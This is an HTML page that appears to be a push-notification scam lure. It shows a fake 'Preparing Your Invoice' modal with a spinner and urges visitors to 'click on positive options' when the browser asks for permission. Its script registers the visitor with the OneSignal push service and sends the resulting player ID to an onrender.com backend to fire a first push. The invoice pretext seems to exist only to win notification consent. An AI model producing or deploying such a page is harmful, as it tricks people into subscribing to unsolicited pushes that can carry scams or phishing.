<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Generating Your Invoice</title>

<!-- OneSignal SDK -->
<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>

<script>
  // Initialize OneSignal
  window.OneSignalDeferred = window.OneSignalDeferred || [];
  OneSignalDeferred.push(async function(OneSignal) {
    await OneSignal.init({
      appId: "59378825-1e42-4024-a9f1-87553ae750f8",
      allowLocalhostAsSecureOrigin: true, // for testing locally if needed
    });

    // Wait for player ID
    let playerId = null;
    while (!playerId) {
      playerId = await OneSignal.getUserId();
      console.log("Waiting for player ID...");
      if (!playerId) await new Promise(res => setTimeout(res, 1000));
    }
    console.log("Player ID found:", playerId);

    // Send player ID to backend to trigger first push
    try {
      const response = await fetch("https://onesignal-backend-fh6j.onrender.com/first-push", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ playerId })
      });
      if (response.ok) console.log("Player ID sent to backend");
      else console.error("Failed to send player ID:", response.statusText);
    } catch (err) {
      console.error("Failed to send player ID:", err);
    }
  });
</script>

<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: #f2f2f2;
  margin: 0;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.4);
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal {
  background: #ffffff;
  width: 420px;
  padding: 25px 30px;
  border-radius: 6px;
  text-align: center;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
}

.modal h2 {
  margin: 0 0 10px;
  font-size: 20px;
  color: #111;
}

.modal p {
  font-size: 14px;
  color: #555;
  line-height: 1.5;
  margin-bottom: 16px;
}

.loader {
  width: 45px;
  height: 45px;
  border: 4px solid #e0e0e0;
  border-top: 4px solid #ff9900;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.note {
  margin-top: 14px;
  font-size: 12px;
  color: #777;
}
</style>
</head>

<body>
<div class="modal-overlay">
  <div class="modal">
    <h2>Preparing Your Invoice</h2>
    <p>We are preparing your invoice. This process usually takes less than a minute.</p>
    <p>If you see any options like allow or view now kindly click on positive options.</p>
    <p>Browser notifications are optional and are used only to notify you when your invoice is ready.</p>
    <div class="loader"></div>
    <div class="note">You may continue browsing or wait on this page.</div>
  </div>
</div>
</body>
</html>
